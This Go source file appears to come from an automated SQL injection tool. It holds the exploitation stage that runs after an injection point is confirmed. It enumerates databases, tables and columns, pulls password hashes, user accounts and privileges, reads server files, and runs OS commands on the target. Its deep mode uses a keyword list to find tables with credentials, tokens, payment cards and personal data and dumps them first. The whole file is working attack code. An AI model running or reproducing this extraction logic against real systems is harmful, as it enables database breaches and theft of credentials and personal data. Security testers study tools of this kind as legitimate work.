package core

import (
	"fmt"
	"strings"
)

// Scope is one database/schema pair to traverse. Schema is empty when the
// DBMS has no schema layer (MySQL) or the operator did not ask for one.
type Scope struct {
	DB     string
	Schema string
}

func (s Scope) Label() string {
	if s.Schema != "" && !strings.EqualFold(s.Schema, s.DB) {
		return s.DB + "." + s.Schema
	}
	if s.DB != "" {
		return s.DB
	}
	return "current"
}

// Explorer drives enumeration and extraction through the confirmed session.
// It is deliberately database-agnostic: all SQL differences live in Dialect.
type Explorer struct {
	E *Engine
	X *Executor
	S *Session

	scopesCache []Scope
}

func NewExplorer(e *Engine, s *Session) *Explorer {
	return &Explorer{E: e, X: NewExecutor(e, s), S: s}
}

func (x *Explorer) result(kind, details, payload string) Result {
	return Result{
		Parameter:   x.S.Point.Name,
		Type:        kind,
		Payload:     payload,
		DBMS:        x.S.DBMS,
		DBMSVersion: x.S.DBMSVersion,
		Details:     details,
		Confidence:  1.0,
		Location:    string(x.S.Point.Location),
		Technique:   x.S.Technique,
		Prefix:      x.S.Boundary.Prefix,
		Suffix:      x.S.Boundary.Suffix,
		Columns:     x.S.Columns,
	}
}

func (x *Explorer) tableResult(kind string, ref TableRef, payload string) Result {
	res := x.result(kind, ref.Name(), payload)
	res.Database = ref.DB
	res.Schema = ref.Schema
	res.Table = ref.Table
	return res
}

// Run executes every action requested through the CLI options.
func (x *Explorer) Run() []Result {
	var out []Result
	opts := x.E.Opts

	if opts.Fingerprint || opts.BannerGrab || opts.CurrentDB || opts.CurrentUser ||
		opts.Hostname || opts.Privileges || opts.IsDBA || opts.Banner || opts.Deep {
		out = append(out, x.fingerprint()...)
	}

	if opts.Users || opts.Passwords || opts.Roles {
		out = append(out, x.accounts()...)
	}

	if opts.SQLQuery != "" {
		if value, err := x.X.Scalar(opts.SQLQuery); err == nil {
			out = append(out, x.result("sql-query", opts.SQLQuery, value))
		} else {
			x.E.logWarn(fmt.Sprintf("SQL query failed: %v", err))
		}
	}

	if opts.FileRead != "" {
		if expr, ok := x.X.Dialect.FileRead(opts.FileRead); ok {
			if value, err := x.X.Scalar(expr); err == nil {
				out = append(out, x.result("file-read", opts.FileRead, value))
			} else {
				x.E.logWarn(fmt.Sprintf("file read failed: %v", err))
			}
		} else {
			x.E.logWarn(fmt.Sprintf("file read is not supported for %s", x.S.DBMS))
		}
	}

	if opts.FileExec != "" {
		if expr, ok := x.X.Dialect.OSCmd(opts.FileExec); ok {
			if value, err := x.X.Scalar(expr); err == nil {
				out = append(out, x.result("os-cmd", opts.FileExec, value))
			} else {
				x.E.logWarn(fmt.Sprintf("OS command failed: %v", err))
			}
		} else {
			x.E.logWarn(fmt.Sprintf("OS command execution is not supported for %s", x.S.DBMS))
		}
	}

	if opts.FileWrite != "" {
		x.E.logWarn("file write is not available through the current extraction path; use --sql-query with a dialect-specific statement")
	}

	if opts.Deep {
		out = append(out, x.deep()...)
		return out
	}

	if opts.ListDBs || opts.DumpAll || opts.Schema || opts.ListSchemas {
		out = append(out, x.listDatabases()...)
	}

	if opts.ListSchemas || opts.DumpAll || opts.Schema || opts.Deep {
		out = append(out, x.listSchemas()...)
	}

	if opts.Search != "" {
		out = append(out, x.search(opts.Search)...)
	}

	if opts.ListTables || opts.DumpAll || opts.Schema {
		out = append(out, x.listTables()...)
	}

	if opts.ListColumns || opts.DumpAll {
		out = append(out, x.listColumns()...)
	}

	if opts.Schema {
		out = append(out, x.schema()...)
	}

	if opts.CountRows {
		out = append(out, x.countRows()...)
	}

	if opts.DumpAll {
		out = append(out, x.dumpAll()...)
	} else if opts.DumpTable != "" || opts.Table != "" {
		table := opts.DumpTable
		if table == "" {
			table = opts.Table
		}
		ref := x.resolveRef(table)
		out = append(out, x.dumpTable(ref)...)
	}

	return out
}

func (x *Explorer) fingerprint() []Result {
	var out []Result
	items := []struct {
		kind  string
		expr  string
		label string
	}{
		{"banner", x.X.Dialect.Version(), "DBMS version"},
		{"current-db", x.X.Dialect.CurrentDB(), "current database"},
		{"current-user", x.X.Dialect.User(), "current user"},
		{"hostname", x.X.Dialect.Hostname(), "hostname"},
		{"is-dba", x.X.Dialect.IsDBA(), "is DBA"},
		{"privileges", x.X.Dialect.Privileges(), "privileges"},
	}
	for _, item := range items {
		value, err := x.X.Scalar(item.expr)
		if err != nil || value == "" {
			continue
		}
		out = append(out, x.result(item.kind, item.label, value))
		x.E.logSuccess(fmt.Sprintf("%s: %s", item.label, value))
	}
	return out
}

// currentDatabase resolves the active database once and caches it in the
// session so repeated traversals do not spend requests on the same value.
func (x *Explorer) currentDatabase() string {
	if x.S.CurrentDB != "" {
		return x.S.CurrentDB
	}
	value, err := x.X.Scalar(x.X.Dialect.CurrentDB())
	if err != nil {
		return ""
	}
	x.S.CurrentDB = value
	return value
}

func (x *Explorer) listDatabases() []Result {
	values, err := x.X.Strings(x.X.Dialect.Databases())
	if err != nil {
		x.E.logWarn(fmt.Sprintf("could not list databases: %v", err))
		return nil
	}
	x.E.Log.ListDBHeader()
	for _, db := range values {
		x.E.Log.ListDB(db)
	}
	x.E.Log.Blank()
	return []Result{x.result("list-dbs", "available databases", strings.Join(values, ","))}
}

func (x *Explorer) listSchemas() []Result {
	var out []Result
	expr := x.X.Dialect.Schemas("")
	if strings.TrimSpace(expr) == "" {
		return nil
	}
	for _, db := range x.databasesToScan() {
		values, err := x.X.Strings(x.X.Dialect.Schemas(db))
		if err != nil || len(values) == 0 {
			continue
		}
		x.E.Log.SectionHeader(fmt.Sprintf("SCHEMAS (%s)", db))
		for _, s := range values {
			x.E.Log.SectionItem(s)
		}
		x.E.Log.Blank()
		res := x.result("list-schemas", db, strings.Join(values, ","))
		res.Database = db
		out = append(out, res)
	}
	return out
}

func (x *Explorer) databasesToScan() []string {
	if x.E.Opts.Database != "" {
		return []string{x.E.Opts.Database}
	}
	values, err := x.X.Strings(x.X.Dialect.Databases())
	if err != nil || len(values) == 0 {
		if current := x.currentDatabase(); current != "" {
			return []string{current}
		}
		return nil
	}
	var out []string
	for _, db := range values {
		if isSystemDB(db) && x.E.Opts.RiskLevel < 3 {
			continue
		}
		out = append(out, db)
	}
	if len(out) == 0 {
		out = values
	}
	return out
}

// scopes expands the requested database into database/schema pairs.
func (x *Explorer) scopes() []Scope {
	if x.scopesCache != nil {
		return x.scopesCache
	}
	var out []Scope
	forcedSchema := x.E.Opts.SchemaName
	for _, db := range x.databasesToScan() {
		schemaExpr := x.X.Dialect.Schemas(db)
		if forcedSchema != "" || strings.TrimSpace(schemaExpr) == "" {
			out = append(out, Scope{DB: db, Schema: forcedSchema})
			continue
		}
		schemas, err := x.X.Strings(schemaExpr)
		if err != nil || len(schemas) == 0 {
			out = append(out, Scope{DB: db, Schema: ""})
			continue
		}
		added := 0
		for _, s := range schemas {
			if isSystemSchema(s) && x.E.Opts.RiskLevel < 3 {
				continue
			}
			out = append(out, Scope{DB: db, Schema: s})
			added++
		}
		if added == 0 {
			out = append(out, Scope{DB: db, Schema: ""})
		}
	}
	if len(out) == 0 {
		out = append(out, Scope{DB: x.E.Opts.Database, Schema: forcedSchema})
	}
	x.scopesCache = out
	return out
}

func (x *Explorer) resolveRef(table string) TableRef {
	ref := TableRef{
		DB:     x.E.Opts.Database,
		Schema: x.E.Opts.SchemaName,
		Table:  table,
	}
	// Allow "db.table" and "db.schema.table" in --dump-table.
	parts := strings.Split(table, ".")
	switch len(parts) {
	case 2:
		if ref.DB == "" {
			ref.DB, ref.Table = parts[0], parts[1]
		}
	case 3:
		if ref.DB == "" {
			ref.DB = parts[0]
		}
		if ref.Schema == "" {
			ref.Schema = parts[1]
		}
		ref.Table = parts[2]
	}
	if ref.DB == "" {
		ref.DB = x.currentDatabase()
	}
	if ref.Schema == "" {
		ref.Schema = defaultSchemaFor(x.S.DBMS)
	}
	return ref
}

func (x *Explorer) tablesFor(scope Scope) []string {
	values, err := x.X.Strings(x.X.Dialect.Tables(scope.DB, scope.Schema))
	if err != nil {
		return nil
	}
	return values
}

func (x *Explorer) listTables() []Result {
	var out []Result
	for _, scope := range x.scopes() {
		values := x.tablesFor(scope)
		if len(values) == 0 {
			continue
		}
		x.E.Log.SectionHeader(fmt.Sprintf("TABLES (%s)", scope.Label()))
		for _, t := range values {
			x.E.Log.SectionItem(t)
		}
		x.E.Log.Blank()
		res := x.result("list-tables", scope.Label(), strings.Join(values, ","))
		res.Database = scope.DB
		res.Schema = scope.Schema
		out = append(out, res)
	}
	return out
}

func (x *Explorer) listColumns() []Result {
	var out []Result
	table := x.E.Opts.Table
	ref := TableRef{DB: x.E.Opts.Database, Schema: x.E.Opts.SchemaName, Table: table}
	if table != "" {
		if ref.DB == "" {
			ref.DB = x.currentDatabase()
		}
		return x.columnsFor(ref)
	}
	for _, scope := range x.scopes() {
		for _, t := range x.tablesFor(scope) {
			out = append(out, x.columnsFor(TableRef{DB: scope.DB, Schema: scope.Schema, Table: t})...)
		}
	}
	return out
}

func (x *Explorer) columnsFor(ref TableRef) []Result {
	values, err := x.X.Strings(x.X.Dialect.Columns(ref.DB, ref.Schema, ref.Table))
	if err != nil || len(values) == 0 {
		return nil
	}
	x.E.Log.SectionHeader(fmt.Sprintf("COLUMNS (%s)", ref.Name()))
	for _, c := range values {
		x.E.Log.SectionItem(c)
	}
	x.E.Log.Blank()
	res := x.tableResult("list-columns", ref, strings.Join(values, ","))
	res.ColumnNames = values
	return []Result{res}
}

func (x *Explorer) accounts() []Result {
	var out []Result
	items := []struct {
		enabled bool
		kind    string
		expr    string
		label   string
	}{
		{x.E.Opts.Users, "users", x.X.Dialect.Users(), "database users"},
		{x.E.Opts.Passwords, "passwords", x.X.Dialect.Passwords(), "password hashes"},
		{x.E.Opts.Roles, "roles", x.X.Dialect.Roles(), "database roles"},
	}
	supported := 0
	for _, item := range items {
		if !item.enabled {
			continue
		}
		// Some dialects expose no account views at all. The empty literal is
		// the dialect's explicit marker for an unsupported feature.
		if strings.TrimSpace(item.expr) == "''" {
			continue
		}
		supported++
		value, err := x.X.Scalar(item.expr)
		if err != nil || value == "" {
			if err != nil {
				x.E.logWarn(fmt.Sprintf("could not read %s: %v", item.label, err))
			}
			continue
		}
		x.E.Log.SectionHeader(fmt.Sprintf("%s (%s)", strings.ToUpper(item.label), x.S.DBMS))
		for _, entry := range splitRowValues(value) {
			x.E.Log.SectionData(entry)
		}
		x.E.Log.Blank()
		out = append(out, x.result(item.kind, item.label, value))
	}
	if supported == 0 {
		x.E.logWarn(fmt.Sprintf("account enumeration is not supported for %s", x.S.DBMS))
	}
	return out
}

func (x *Explorer) schema() []Result {
	var out []Result
	for _, scope := range x.scopes() {
		for _, table := range x.tablesFor(scope) {
			ref := TableRef{DB: scope.DB, Schema: scope.Schema, Table: table}
			value, err := x.X.Scalar(x.X.Dialect.TableColumns(scope.DB, scope.Schema, table))
			if err != nil || value == "" {
				continue
			}
			columns := splitRowValues(value)
			x.E.Log.SectionHeader(fmt.Sprintf("SCHEMA (%s)", ref.Name()))
			for _, column := range columns {
				x.E.Log.SectionItem(column)
			}
			x.E.Log.Blank()
			out = append(out, x.tableResult("schema", ref, strings.Join(columns, ",")))
		}
	}
	return out
}

func (x *Explorer) countRows() []Result {
	var out []Result
	table := x.E.Opts.Table
	if table != "" {
		ref := x.resolveRef(table)
		return x.countFor(ref)
	}
	for _, scope := range x.scopes() {
		for _, t := range x.tablesFor(scope) {
			out = append(out, x.countFor(TableRef{DB: scope.DB, Schema: scope.Schema, Table: t})...)
		}
	}
	return out
}

func (x *Explorer) countFor(ref TableRef) []Result {
	expr := x.X.Dialect.RowCount(ref, x.E.Opts.Where)
	value, err := x.X.Scalar(expr)
	if err != nil {
		return nil
	}
	res := x.tableResult("count-rows", ref, value)
	return []Result{res}
}

func (x *Explorer) dumpLimit() int {
	limit := x.E.Opts.Rows
	if limit <= 0 {
		limit = x.E.Opts.Limit
	}
	if limit <= 0 {
		limit = 50
	}
	return limit
}

func (x *Explorer) batchSize() int {
	n := x.E.Opts.DumpBatch
	if n <= 0 {
		n = x.E.Opts.ExtractBatchSize
	}
	if n <= 0 {
		n = 10
	}
	if n > 200 {
		n = 200
	}
	return n
}

// dumpTable extracts rows for one table, honoring --where, --columns-csv,
// --offset and the batch size.
func (x *Explorer) dumpTable(ref TableRef) []Result {
	if ref.Table == "" {
		return nil
	}
	colValues, err := x.X.Strings(x.X.Dialect.Columns(ref.DB, ref.Schema, ref.Table))
	if err != nil || len(colValues) == 0 {
		x.E.logWarn(fmt.Sprintf("could not list columns for %s", ref.Name()))
		return nil
	}
	cols := colValues
	if x.E.Opts.ColumnsCSV != "" {
		cols = filterColumns(colValues, x.E.Opts.ColumnsCSV)
		if len(cols) == 0 {
			x.E.logWarn(fmt.Sprintf("none of the requested columns exist in %s", ref.Name()))
			return nil
		}
	}

	limit := x.dumpLimit()
	offset := x.E.Opts.Offset
	batch := x.batchSize()
	var rows [][]string
	for len(rows) < limit {
		want := batch
		if remaining := limit - len(rows); remaining < want {
			want = remaining
		}
		got, err := x.X.DumpBatch(ref, cols, offset+len(rows), want, x.E.Opts.Where)
		if err != nil {
			x.E.logWarn(fmt.Sprintf("row extraction error on %s: %v", ref.Name(), err))
			break
		}
		if len(got) == 0 {
			break
		}
		rows = append(rows, got...)
		if len(got) < want {
			// A truncated aggregation returns fewer complete rows than asked
			// for. Probe the next offset once: if a row exists the loop keeps
			// going from the exact position instead of ending early.
			probe, err := x.X.DumpBatch(ref, cols, offset+len(rows), 1, x.E.Opts.Where)
			if err != nil || len(probe) == 0 {
				break
			}
			rows = append(rows, probe...)
		}
	}
	if len(rows) > limit {
		rows = rows[:limit]
	}
	if len(rows) == 0 {
		x.E.logWarn(fmt.Sprintf("no rows extracted from %s", ref.Name()))
		return nil
	}

	x.E.Log.SectionHeader(fmt.Sprintf("DATA (%s)", ref.Name()))
	x.E.Log.SectionData(strings.Join(cols, " | "))
	for _, row := range rows {
		x.E.Log.SectionData(strings.Join(row, " | "))
	}
	x.E.Log.Blank()
	x.E.logSuccess(fmt.Sprintf("%d row(s) from %s", len(rows), ref.Name()))

	res := x.tableResult("dump-table", ref, fmt.Sprintf("%d rows", len(rows)))
	res.ColumnNames = cols
	res.Rows = rows
	return []Result{res}
}

func (x *Explorer) dumpAll() []Result {
	var out []Result
	for _, scope := range x.scopes() {
		for _, table := range x.tablesFor(scope) {
			if isSystemTable(table) && x.E.Opts.RiskLevel < 3 {
				continue
			}
			out = append(out, x.dumpTable(TableRef{DB: scope.DB, Schema: scope.Schema, Table: table})...)
		}
	}
	return out
}

// deep runs the full automatic sweep: metadata, every database and schema,
// table inventory, row counts and a dump of the sensitive tables followed by a
// shallow dump of everything else. --dump-all turns the shallow pass into a
// full one.
func (x *Explorer) deep() []Result {
	var out []Result
	out = append(out, x.listDatabases()...)
	out = append(out, x.listSchemas()...)

	type tableInfo struct {
		ref  TableRef
		rows string
	}
	var all []tableInfo

	for _, scope := range x.scopes() {
		tables := x.tablesFor(scope)
		if len(tables) == 0 {
			continue
		}
		res := x.result("list-tables", scope.Label(), strings.Join(tables, ","))
		res.Database = scope.DB
		res.Schema = scope.Schema
		out = append(out, res)
		x.E.Log.SectionHeader(fmt.Sprintf("TABLES (%s)", scope.Label()))
		for _, t := range tables {
			x.E.Log.SectionItem(t)
		}
		x.E.Log.Blank()

		for _, table := range tables {
			if isSystemTable(table) && x.E.Opts.RiskLevel < 3 {
				continue
			}
			ref := TableRef{DB: scope.DB, Schema: scope.Schema, Table: table}
			out = append(out, x.columnsFor(ref)...)
			counts := x.countFor(ref)
			out = append(out, counts...)
			rows := ""
			if len(counts) > 0 {
				rows = counts[0].Payload
			}
			all = append(all, tableInfo{ref: ref, rows: rows})
		}
	}

	limit := x.dumpLimit()
	if !x.E.Opts.DumpAll && limit > 20 {
		limit = 20
	}

	var other []tableInfo
	for _, info := range all {
		if isSensitiveTable(info.ref.Table) {
			out = append(out, x.dumpWithLimit(info.ref, limit)...)
			continue
		}
		other = append(other, info)
	}
	shallow := limit
	if !x.E.Opts.DumpAll && shallow > 5 {
		shallow = 5
	}
	for _, info := range other {
		if x.E.Opts.DumpAll {
			out = append(out, x.dumpWithLimit(info.ref, limit)...)
			continue
		}
		out = append(out, x.dumpWithLimit(info.ref, shallow)...)
	}
	return out
}

func (x *Explorer) dumpWithLimit(ref TableRef, limit int) []Result {
	prevRows, prevLimit := x.E.Opts.Rows, x.E.Opts.Limit
	x.E.Opts.Rows = limit
	x.E.Opts.Limit = limit
	defer func() {
		x.E.Opts.Rows = prevRows
		x.E.Opts.Limit = prevLimit
	}()
	return x.dumpTable(ref)
}

func (x *Explorer) search(keyword string) []Result {
	var out []Result
	tables, err := x.X.Strings(x.X.Dialect.SearchTables(keyword))
	if err == nil && len(tables) > 0 {
		out = append(out, x.result("search-tables", keyword, strings.Join(tables, ",")))
		x.E.Log.SectionHeader(fmt.Sprintf("TABLES MATCHING '%s'", keyword))
		for _, t := range tables {
			x.E.Log.SectionItem(t)
		}
		x.E.Log.Blank()
	}
	columns, err := x.X.Strings(x.X.Dialect.SearchColumns(keyword))
	if err == nil && len(columns) > 0 {
		out = append(out, x.result("search-columns", keyword, strings.Join(columns, ",")))
		x.E.Log.SectionHeader(fmt.Sprintf("COLUMNS MATCHING '%s'", keyword))
		for _, c := range columns {
			x.E.Log.SectionItem(c)
		}
		x.E.Log.Blank()
	}
	return out
}

func filterColumns(cols []string, csv string) []string {
	wanted := splitCSV(csv)
	if len(wanted) == 0 {
		return cols
	}
	out := make([]string, 0, len(wanted))
	for _, col := range cols {
		for _, name := range wanted {
			if strings.EqualFold(col, name) {
				out = append(out, col)
				break
			}
		}
	}
	return out
}

func isSystemTable(name string) bool {
	lower := strings.ToLower(strings.TrimSpace(name))
	for _, prefix := range []string{"sqlite_", "pg_", "information_schema", "performance_schema", "mysql.", "sys."} {
		if strings.HasPrefix(lower, prefix) {
			return true
		}
	}
	return false
}

func isSystemSchema(name string) bool {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "information_schema", "pg_catalog", "pg_toast", "sys", "guest", "system",
		"crdb_internal", "snowflake", "mysql", "performance_schema":
		return true
	}
	return false
}

// isSensitiveTable marks the tables that usually hold credentials or
// personal data. Deep mode dumps these first and deepest.
func isSensitiveTable(name string) bool {
	sensitive := []string{
		"user", "admin", "account", "member", "staff", "credential", "customer",
		"client", "employee", "person", "profile", "login", "passwd", "password",
		"secret", "token", "session", "api", "key", "config", "setting",
		"payment", "order", "transaction", "wallet", "balance", "flag",
		"auth", "identity", "email", "phone", "address", "card",
	}
	lower := strings.ToLower(name)
	for _, s := range sensitive {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}
